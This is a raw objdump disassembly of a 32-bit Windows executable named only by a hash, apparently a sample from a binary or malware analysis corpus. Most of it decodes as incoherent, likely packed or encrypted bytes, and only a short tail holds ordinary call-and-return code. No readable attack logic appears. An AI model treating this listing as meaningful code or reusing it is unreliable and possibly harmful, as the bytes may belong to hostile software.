
2d10c5a00680c3a2cd100715abde8b7af431dc5fd581da6002f87004398aa312.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	into   
  4d0001:	popa   
  4d0002:	sahf   
  4d0003:	cmp    edi,DWORD PTR [ebx]
  4d0005:	repnz mov dl,0xf2
  4d0008:	popa   
  4d0009:	loop   0x4d0088
  4d000b:	jbe    0x4d0046
  4d000d:	push   ebp
  4d000e:	or     cl,cl
  4d0010:	mov    eax,ds:0x2d4eeb1f
  4d0015:	mov    al,0xb6
  4d0017:	mov    edx,0xd5d9a824
  4d001c:	or     BYTE PTR [ecx],ah
  4d001e:	stos   BYTE PTR es:[edi],al
  4d001f:	jmp    0x4d001d
  4d0021:	xor    esi,DWORD PTR [esi+esi*8-0x1efaffe]
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0697
  4d06c1:	xor    dh,BYTE PTR ds:0x7834fe4e
  4d06c7:	(bad)  
  4d06c8:	(bad)  [edi+esi*2-0x45]
  4d06cc:	cmp    al,0x65
  4d06ce:	mov    edi,0xf94653f
  4d06d3:	cmp    eax,0x48432633
  4d06d8:	repz int3 
  4d06da:	cmc    
  4d06db:	cli    
  4d06dc:	std    
  4d06dd:	jno    0x4d0707
  4d06df:	mov    bh,0xb9
  4d06e1:	mov    ebx,0xc34577c7
  4d06e6:	mov    edx,0xc0d5286
  4d06eb:	jl     0x4d074c
  4d06ed:	call   DWORD PTR ds:0x4d203c
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x60
  4d0700:	mov    edx,0x4d31a4
  4d0705:	xor    DWORD PTR [edx-0x68],0x71
  4d0709:	push   edx
  4d070a:	push   eax
  4d070b:	push   DWORD PTR [edx+0xb8]
  4d0711:	push   DWORD PTR [edx+0x98]
  4d0717:	push   edi
  4d0718:	call   0x4d0c9c
  4d071d:	add    esp,0x10
  4d0720:	pop    edx
  4d0721:	push   edx
  4d0722:	push   0x0
  4d0724:	call   0x4d0da4
  4d0729:	add    esp,0x4
  4d072c:	pop    edx
  4d072d:	push   edx
  4d072e:	lea    edi,[edx-0x1a4]
  4d0734:	push   edi
  4d0735:	call   0x4d0be4
  4d073a:	add    esp,0x4
  4d073d:	test   eax,eax
  4d073f:	jne    0x4d072e
  4d0741:	pop    edx
  4d0742:	add    esp,0x60
  4d0745:	pop    ebp
  4d0746:	ret    
  4d0747:	add    BYTE PTR [edi-0x1],bl
  4d074a:	adc    eax,0x4d2020
  4d074f:	call   edi
  4d0751:	add    BYTE PTR [eax],al
  4d0753:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0759:	sub    esp,0x2c
  4d075c:	lea    ebx,ds:0x4d3130
  4d0762:	adc    DWORD PTR [ebp-0x14],esi
  4d0765:	push   0x0
  4d0767:	call   0x4d1034
  4d076c:	add    esp,0x4
  4d076f:	push   ebx
  4d0770:	push   DWORD PTR [ebx+0x1cc]
  4d0776:	push   DWORD PTR [ebx+0xc0]
  4d077c:	push   eax
  4d077d:	call   0x4d1094
  4d0782:	add    esp,0xc
  4d0785:	pop    ebx
  4d0786:	mov    edi,0x4d2024
  4d078b:	mov    edi,DWORD PTR [edi]
  4d078d:	push   edi
  4d078e:	push   DWORD PTR [ebx-0xe4]
  4d0794:	pop    edx
  4d0795:	call   edx
  4d0797:	add    esp,0x2c
  4d079a:	pop    ebp
  4d079b:	ret    
  4d079c:	pop    edi
  4d079d:	call   DWORD PTR ds:0x4d2014
  4d07a3:	call   edi
  4d07a5:	add    BYTE PTR [eax],al
